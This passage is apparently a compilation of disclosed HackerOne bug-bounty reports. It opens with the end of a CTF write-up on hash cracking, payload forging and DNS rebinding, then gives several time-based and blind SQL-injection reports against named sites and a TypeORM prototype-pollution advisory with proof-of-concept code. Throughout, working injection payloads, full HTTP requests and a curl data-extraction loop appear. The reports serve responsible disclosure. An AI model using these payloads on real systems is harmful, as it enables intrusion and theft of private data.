  "hash":"5f2940d65ca4140cc18d0878bc398955"
}
```

Great, another payload with another authentication hash. Maybe we can crack this one? Enter hashcat!
```hashcat
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($pass.$salt)
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
Time.Started.....: Tue Dec 29 22:44:30 2020 (0 secs)
Time.Estimated...: Tue Dec 29 22:44:30 2020 (0 secs)
Guess.Base.......: File (..\h1-xmas-ctf\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17556.6 kH/s (5.91ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5898240/14344385 (41.12%)
Rejected.........: 0/5898240 (0.00%)
Restore.Point....: 4915200/14344385 (34.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: omarsnork -> madruboisvert55
Hardware.Mon.#1..: Temp: 41c Fan:  0% Util: 30% Core:1632MHz Mem:3802MHz Bus:16
```

Apparently, yes, yes we can.
Success was achieved first try by formatting a text file named `hash2.txt` like so:
``` 
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
```
(curse you, `hash.txt`)

Then, we run hashcat like so:
```powershell
.\hashcat.exe -m 10 -a 0 .\hash2.txt ..\h1-xmas-ctf\rockyou.txt
```

The `hash2.txt` format along with options `-m 10 -a 0` tells hashcat to try to turn the ip `203.0.113.33` into the hash `5f2940d65ca4140cc18d0878bc398955` by using a line from `rockyou.txt` and stuffing them together like so: `md5(LINEFROMROCKYOU . '203.0.113.33')`.

We are quickly informed that the salt (pepper, actually) is `mrgrinch463`. Nice!

Using this, let's try our hand at creating a custom payload and see if we can change what the DDoS script attacks.

First, let's insert an IFRAME into the `attack-box` and give it the id `frame` - this way we can easily monitor what goes on in real time. I did this by opening the inspector and editing the first DIV inside the DIV with class `container`, though anywhere on the webpage should do.

{F1138540}

Next, I entered this little snippet into the console:

```javascript
// copy and paste md5 from here http://www.myersdaily.org/joseph/javascript/md5.js into the console
let lo = (load) => {
    load = decodeURIComponent(load);
    console.log("Running", load);
    const hash = md5(`mrgrinch463${load}`);
    const tar = `/attack-box/launch?payload=${btoa(`{"target":"${load}","hash":"${hash}"}`)}`;
    document.getElementById("frame").src = tar;
}
```

This let's us easily construct a new payload and load it into the IFRAME. 

Let's try it with google as the target:

```javascript
lo("google.com");
```

{F1138542}

Ah yes, we can create custom payloads with any target we'd like! (sorry google). Let's shut down `localhost`!

```javascript
lo("localhost");
```

{F1138543}

...
Same thing for `127.0.0.1`, `hackyholidays.h1ctf.com`, and so on. So there's some kind of protection for local targets in place... Hmm.

Running another domain, I noticed there was a slight delay between
```
Getting Host information for: test.com
Host resolves to x.x.x.x
```
and
```
Spinning up botnet
Launching attack against: ...
```

Just a few seconds, but probably enough time to perform a DNS Rebinding attack.

Let's do it!
I control my own domain, but it won't let me set the TTL to anything lower than 600 seconds, so the code below will reflect that.

First up, create a custom subdomain like `hacky.example.com` on a domain you own or through any service that lets you control TTL and destination. Point it to any IP that isn't `18.216.153.32`, the IP of the CTF (and the Grinch's server). Set the TTL to 600 seconds.

Next, run a request against `hacky.example.com` and at the same time, initiate a timer to run a *second* request 598 seconds later (big maths incorporating load times, the alignment of the stars and what not).
```javascript
setTimeout(() => { lo("hacky.example.com") }, 598000);
lo("hacky.example.com");
```

While waiting for the timer to run its course, leisurely change the DNS pointer for `hacky.example.com` to point to `127.0.0.1` and then grab a coffee or something. Take your time, brew it properly. Or a nice, warm cup of tea, as the Spiffing Brit would recommend. You might also take a moment to ponder what choices in life has led you to this point.

Once the timer is done, you will (hopefully) be greeted by this:
{F1138544}

The 12th, and final, flag is `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`. The Grinch's server is down, Christmas has been saved, I get no coal, and maybe, just maybe, I can get that Snow Ball Launcher.

#Shout outs

Big thanks to HackerOne, Adam, Naham for this CTF - looking forward to the next one!

Also shout outs to the people of HackerOne's discord who were very kind and helpful with hints and nudges for those of us stuck! I hope I can return the favour some day!

## Impact

Lots of vulns!

---

### [[intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php](https://hackerone.com/reports/1042746)

- **Report ID:** `1042746`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Automattic
- **Reporter:** @fuzzme
- **Bounty:** - usd
- **Disclosed:** 2021-01-01T09:20:01.622Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary 

Hello, i have found a SQLI Injection Time Based on `https://www.intensedebate.com/changeReplaceOpt.php`.

The parameter `$_GET['acctid']` is vulnerable.



## Detection

I have inject a MySQL function `sleep()`,  and it works.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

Response time: 15 414 millis.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

7 486 millis.

## POC 

database() : id_commxn2s


Thank you, good bye.

## Impact

Full database access holding private user information.

---

### [[intensedebate.com] SQL Injection Time Based On /js/commentAction/](https://hackerone.com/reports/1044698)

- **Report ID:** `1044698`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Automattic
- **Reporter:** @fuzzme
- **Bounty:** - usd
- **Disclosed:** 2021-01-01T09:19:37.451Z
- **CVE(s):** -

**Vulnerability Information:**

[intensedebate.com] SQLi Time Based On /js/commentAction/

## Summary:

Hello,

I have found a SQLI Injection Time Based on `/js/commentAction/`.

When a user want to submit/reply to a comment, a JSON payload was send by a GET request.


```GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com```

The key `"acctid":"251219"` is vulnerable to SQL Injection Time based


## Detection :

```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

HTTP Response `15 414 millis`


```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

HTTP Response `7 660 millis`

Bonus :  the  key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS')>"` and you will see a XSS pop-up


## POC

SQLi Time based : sleep_7.png, sleep_15.png and POC.mp4
Self-XSS : Self-XSS.mp4


Thank you, good bye.

Fuzzme.

## Impact

Full database access holding private user information.

---

### [Sql injection on docs.atavist.com](https://hackerone.com/reports/1039315)

- **Report ID:** `1039315`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Automattic
- **Reporter:** @lu3ky-13
- **Bounty:** - usd
- **Disclosed:** 2020-12-08T09:32:55.407Z
- **CVE(s):** -

**Vulnerability Information:**

hello dear team 

I have found SQL injection on docs.atavist.com
url:http://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort=

parameters: injectable search=0

```
Parameter: search (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=
```
```
[20:54:30] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.34
back-end DBMS: MySQL >= 5.0.12
```


Request
-----------

```
GET /reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort= HTTP/1.1
Host: docs.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _fbp=fb.1.1605829485735.1219501220; __stripe_mid=f950034a-6de5-408c-b227-5ef48058f129d296dd; rgisanonymous=true; rguserid=5625868d-bfff-49dc-90ac-0269e5138dc8; rguuid=true
Upgrade-Insecure-Requests: 1


```

F1087069: 43.PNG

the website in scope other report
https://hackerone.com/reports/950881

## Impact

Use parameterized queries when dealing with SQL queries that contains user input. Parameterized queries allows the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

**Summary (researcher):**

kurdistan-iraq

---

### [[SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter](https://hackerone.com/reports/1024984)

- **Report ID:** `1024984`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @testfortesttest
- **Bounty:** - usd
- **Disclosed:** 2020-11-23T18:07:06.967Z
- **CVE(s):** -

**Vulnerability Information:**

## Step-by-step Reproduction Instructions
 copy the request to your burp suite :
````
GET /█████████/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1
Host: ██████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Connection: close
````

```
payload > 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'    2,077 millis
```

██████████


```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     4,599 millis
```
████████

```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     9,989 millis
```
███


This issue is same to #995122

## Impact

SQL Injection

---

### [Blind SQL injection at tsftp.informatica.com](https://hackerone.com/reports/1034625)

- **Report ID:** `1034625`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Informatica
- **Reporter:** @r1pley
- **Bounty:** - usd
- **Disclosed:** 2020-11-16T10:32:06.952Z
- **CVE(s):** -

**Vulnerability Information:**

The parameter `refresh_token` sent to the REST path /api/v1/token is vulnerable to blind SQL injection.

Compare the response time of these 2 requests:

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
```

vs

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
```
and notice that the WAITFOR DELAY command is executed.

## Impact

Blind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.

I stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.

**Summary (team):**

Researcher identified a time based/blind SQL injection in an Informatica TSFTP website and responsibly disclosed via this report. 

Informatica's incident response team engaged within minutes of the report being received, bringing the site offline for maintenance as the issue was resolved. Following resolution of the issue and confirmation from our security team the site was brought back online. Additionally web server access logs and database logs from before the issue existed were reviewed, showing the issue had not been exploited by any malicious attackers.

---

### [[████] SQL Injections on Referer Header exploitable via Time-Based method](https://hackerone.com/reports/1018621)

- **Report ID:** `1018621`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @polygon35
- **Bounty:** - usd
- **Disclosed:** 2020-11-02T21:40:40.797Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
SQL Injections on Referer Header exploitable via Time-Based method
**Description:**
https://owasp.org/www-community/attacks/SQL_Injection
## Impact
https://owasp.org/www-community/attacks/SQL_Injection
## Step-by-step Reproduction Instructions

First, vulnerable points:
https://███████/███████/library.php?alert=
https://██████████/████████/Chart01.php?alert=
https://████████/████/Chart02.php?alert=
https://██████████/█████████/Chart03.php?alert=
https://████/█████Prod.php?alert=
https://██████████/█████systems.php?alert=
https://█████████/██████████db.php?alert=

(Don't miss the alert GET parameter...)

Okay, let's check the SQLi... lets use time and curl with a true condition (1=1), if 1=1, then, the server sleep 20 seconds else nothing (I just wrote false to make it explicit for you):

```time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "https://████████/█████/Chart01.php?alert=" ```

Okay..then.. let's check the response: 

```Thank you - you may close this window
real	0m21,447s
user	0m0,029s
sys	0m0,000s```

The time is 21 seconds.. then.. let's update the if condition as false (1=2)

```time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'" --url "https://████████/████████/Chart01.php?alert=" ```

Response:

```Thank you - you may close this window
real	0m1,806s
user	0m0,016s
sys	0m0,008s```

Hmm.. approx 2 seconds.. we have proof that's vuln.. let's try more..
I want the first character of the current database name..
let's go for it!:

```for i in {{a..z},{1..9}}; do echo "Testing $i char:"; time curl -s -H "Referer: '+(select*from(select(if(substring(database(),1,1)='$i',sleep(20),false)))a)+'" --url "https://████/██████/Chart01.php?alert="; done```

And there are only one-second answers from time except for the m!

```
Testing l char:
Thank you - you may close this window
real	0m1,321s
user	0m0,028s
sys	0m0,000s
Testing m char:
Thank you - you may close this window
real	0m21,299s
user	0m0,019s
sys	0m0,010s
Testing n char:
Thank you - you may close this window
real	0m1,331s
user	0m0,016s
sys	0m0,012s
```

Thanks for reading!

There is one of these injection points that is supposedly fixed at report #995122 (report disclosed, resolved.. but it's not..)

## Impact

https://owasp.org/www-community/attacks/SQL_Injection

---

### [[SQLI ]Time  Bassed Injection at ██████████ via referer header](https://hackerone.com/reports/995122)

- **Report ID:** `995122`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @yassinek3ch
- **Bounty:** - usd
- **Disclosed:** 2020-10-16T19:46:54.949Z
- **CVE(s):** -

**Vulnerability Information:**

Hi

the ████ was vulnerable to time bassed injection via referer header

#steps
  
1- copy the request to your burp suite :

```GET /DNCdb.php?alert= HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
████=*
Upgrade-Insecure-Requests: 1
Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+' ```

the injection point is``` Referer: http://www.google.com/search?hl=en&q=*```

payload > '+(select*from(select(sleep(7*7)))a)+'  > 7*7 = 49.> 49,708 mills
█████

payload > '+(select*from(select(sleep(20)))a)+'  > 20 = 20,208 mills

██████████

payload>  '+(select*from(select(sleep(20+10)))a)+'  > 10+20=30 > 30,289 mills
██████████

## Impact

SQL Injection, attacker can dump the database of ████

---

### [SQLi in login form of █████](https://hackerone.com/reports/982202)

- **Report ID:** `982202`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @erbbysam
- **Bounty:** - usd
- **Disclosed:** 2020-09-29T20:28:46.838Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.

```
POST /██████████.asp HTTP/█████.████
Host: ███████
```

## Description
```
POST /██████.asp HTTP/████.███
Host: █████
Connection: close
Content-Length: 45
Cache-Control: max-age=0
Upgr███████e-Insecure-Requests: ███
Origin: https://████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?████████
Sec-Fetch-Dest: document
Referer: https://████████/wireless/index.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: █████████████████

usr='/**/or/**/lastName!='&pwd=██████████
```

returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.

To summarize: 
`usr='/**/or/**/lastName!='&pwd=████████` -> 302
`usr='/**/or/**/abc!='&pwd=███` -> 500

case error g██████████get (which could be used to exfil data):
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████` -> 500

Using this, we can prove that there are 26 user accounts:
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████` -> 500

I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.

**if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**

## Impact

SQLi, likely escalation to full service compromise

---

### [[www.zomato.com] Blind SQL Injection in /php/widgets_handler.php](https://hackerone.com/reports/836079)

- **Report ID:** `836079`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @zzzhacker13
- **Bounty:** 2000 usd
- **Disclosed:** 2020-08-10T13:38:54.500Z
- **CVE(s):** -

**Summary (team):**

Disclosing it as per the request from @zzzhacker13. This report is identical to #838855 but it was just on a different endpoint.

### POC - 

- `:/php/widgets_handler.php?method=getResWidgetButton&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END`

Zomato Security Team

---

### [[www.zomato.com] Blind SQL Injection in /php/geto2banner](https://hackerone.com/reports/838855)

- **Report ID:** `838855`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @zzzhacker13
- **Bounty:** 2000 usd
- **Disclosed:** 2020-08-10T13:27:02.782Z
- **CVE(s):** -

**Vulnerability Information:**

## Hi Team!

Our team discovered a ``Blind SQL Injection`` by Abusing LocalParams (`res_id`) in `/php/geto2banner`
**We are working to create a full PDF Report as an WriteUp ;)**

## Here is a Temporal Exploit based on the Vulnerable request:

```
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Connection: close
Content-Length: 73
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

Thank you so much!!

- As you can see in the request - we are able to **Exploit** it to **extract data from your DB**!

## Impact

## Full database access holding private user information.

---

### [Solr Injection in `user_id` parameter at :/v2/leaderboard_v2.json](https://hackerone.com/reports/952501)

- **Report ID:** `952501`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @zzzhacker13
- **Bounty:** 2000 usd
- **Disclosed:** 2020-08-10T07:50:05.409Z
- **CVE(s):** -

**Summary (team):**

@zzzhacker13 identified a Solr Injection on the `user_id` parameter at `:/v2/leaderboard_v2.json`. Our team analyzed internally and found that only `fq={injection}` was possible on the `Solr` endpoint, hence the `Solr injection` was of low impact since there was no way to escalate it to exfiltrate data, one could have just changed the filter query but it wasn't possible to update the fields or anything with these methods.

After the report from @zzzhacker13, the team started analyzing the endpoint and discovered an `SQLi` (boolean based blind SQLi) on another parameter in the same codebase. We went ahead and fixed the issue. The `SQL injection`, however, was critical as per our internal metrics, hence we considered this to be critical because it was discovered as an indirect effect of this report and rewarded the max bounty as per our policies.

|  Action | Timeline (6 Aug, 2020)  |
|---|---|
|  Reported |  18:18 IST  |  
|  Investigation started | 18:23 IST   |  
|  Report validated |   18:30 IST  |
|  Initial contact |   18:56 IST  |
|  SQLi identified (internally) |    19:08 IST  |
|  Triaged |   19:12 IST   |
| Patch PR released and merged |   19:40 IST  |
|  Patch deployed |   22:00 IST  |
|  Severity updated |   22:51 IST  |
|  Rewarded |   23:12 IST  |

Thanks,
Zomato Security Team

---

### [SQL injection (stacked queries) in the export to Excel functionality on Vidyo Server](https://hackerone.com/reports/922567)

- **Report ID:** `922567`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** 8x8
- **Reporter:** @b1ackgamba
- **Bounty:** - usd
- **Disclosed:** 2020-07-29T17:07:56.881Z
- **CVE(s):** -

**Summary (team):**

An abandoned Vidyo server was found to be vulnerable to SQL injection and exposing access to the associated local database. The Vidyo server was retired.

---

### [SQL Injection or Denial of Service due to a Prototype Pollution](https://hackerone.com/reports/869574)

- **Report ID:** `869574`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @phra
- **Bounty:** - usd
- **Disclosed:** 2020-07-24T17:20:06.299Z
- **CVE(s):** CVE-2020-8158

**Vulnerability Information:**

I would like to report a prototype pollution vulnerability in the `typeorm` package.

It allows an attacker that is able to save a specially crafted object to pollute the `Object` prototype and cause side effects on the library/application logic, such as denials of service attacks and/or SQL injections, by adding arbitrary properties to any object in the runtime. If the end application depending on the library has dynamic code evaluation or command execution gadgets, the attacker can potentially trigger arbitrary command execution on the target machine.

# Module

**module name:** TypeORM
**version:** v0.2.24, latest
**npm page:** https://www.npmjs.com/package/typeorm

## Module Description

TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.

## Module Stats

[1] weekly downloads: 385,403

# Vulnerability

## Vulnerability Description

The vulnerability was found after a source code review of the library on GitHub. In particular, the following snippet of code can be found in OrmUtils.ts:

https://github.com/typeorm/typeorm/blob/e92c743fb54fc404658fcaf2254861b6aa63bd98/src/util/OrmUtils.ts#L66
```javascript
/**
 * Deep Object.assign.
 *
 * @see http://stackoverflow.com/a/34749873
 */
function mergeDeep(target, ...sources) {
    if (!sources.length) return target;
    const source = sources.shift();

    if (isObject(target) && isObject(source)) {
        for (const key in source) {
            const value = source[key];
            if (value instanceof Promise)
                continue;

            if (isObject(value)
                && !(value instanceof Map)
                && !(value instanceof Set)
                && !(value instanceof Date)
                && !(value instanceof Buffer)
                && !(value instanceof RegExp)
                && !(value instanceof URL)) {
                if (!target[key])
                    Object.assign(target, { [key]: Object.create(Object.getPrototypeOf(value)) });
                mergeDeep(target[key], value);
            } else {
                Object.assign(target, { [key]: value });
            }
        }
    }

    return mergeDeep(target, ...sources);
}
```

The mentioned function, as we can see from the code, doesn't account for built-in properties such as `__proto__`, causing pollution of the `Object` prototype when a specially crafted object is passed in the rest argument `...sources`.

## Steps To Reproduce:

To test if the function is vulnerable we can run the following proof of concept to confirm that in some situations we can control at least one element in the rest argument and we can trigger the pollution of `Object` prototype with arbitrary properties. 

_pollution.js_
```javascript
function isObject(item) {
    return (item && typeof item === "object" && !Array.isArray(item));
}

/**
 * Deep Object.assign.
 *
 * @see http://stackoverflow.com/a/34749873
 */
function mergeDeep(target, ...sources) {
    if (!sources.length) return target;
    const source = sources.shift();

    if (isObject(target) && isObject(source)) {
        for (const key in source) {
            const value = source[key];
            if (value instanceof Promise)
                continue;

            if (isObject(value)
                && !(value instanceof Map)
                && !(value instanceof Set)
                && !(value instanceof Date)
                && !(value instanceof Buffer)
                && !(value instanceof RegExp)
                && !(value instanceof URL)) {
                if (!target[key])
                    Object.assign(target, { [key]: Object.create(Object.getPrototypeOf(value)) });
                mergeDeep(target[key], value);
            } else {
                Object.assign(target, { [key]: value });
            }
        }
    }

    return mergeDeep(target, ...sources);
}

const a = {}
const b = JSON.parse(`{"__proto__":{"polluted":true}}`)

mergeDeep(a, b)
console.log(`pwned: ${({}).polluted}`)
```

## Exploitation

By naively exploiting the vulnerability, we can cause a denial of service in the running application, for example by causing a loop in the prototype chain as in the following payload:

```javascript
const post = JSON.parse(`{"text":"a","title":{"__proto__":{"polluted":{}}}}`)
```

An SQL injection can be triggered with the following payload, that will add an arbitary WHERE clause to any following query:

```javascript
const post = JSON.parse(`{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}`)
```

A complete proof of concept that can trigger a SQL injection by only depending on the library code is reported here:

(based on https://github.com/typeorm/typescript-example)
_sqli.ts_
```typescript
import { createConnection, getConnection } from "typeorm";
import { Post } from "./entity/Post";
import { Category } from "./entity/Category";

async function cleanUp() {
    await createConnection("mongo")
    await createConnection("mysql")
    const mongoConnection = getConnection("mongo")
    const mysqlConnection = getConnection("mysql")
    await mongoConnection.dropDatabase()
    await mysqlConnection.dropDatabase()
    await mongoConnection.close()
    await mysqlConnection.close()
}

async function main() {
    await cleanUp()
    await createConnection("mongo")
    await createConnection("mysql")
    const mongoConnection = getConnection("mongo")
    const mysqlConnection = getConnection("mysql")

    const post = JSON.parse(`{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}`)

    try {
        await mongoConnection.manager.save(Post, post)
        console.log("Post has been saved: ", post)
        const saved = await mongoConnection.manager.find(Post)
        console.log("Posts were found: ", saved)
    } catch (err) {
        console.error(err)
        const category = new Category()
        category.name = 'category'
        await mysqlConnection.manager.save(Category, category)
        const categories = await mysqlConnection.manager.find(Category, {}) // WHERE name = "sqlinjection"
        console.log("Categories were found: ", categories)
    }
}

main().catch(error => console.log("Error: ", error))
```

## Patch

The function `mergeDeep` has to account for prototype pollution attacks by skipping built-in properties such as `__proto__`. (e.g. https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)

# Wrap up

> Select Y or N for the following statements:

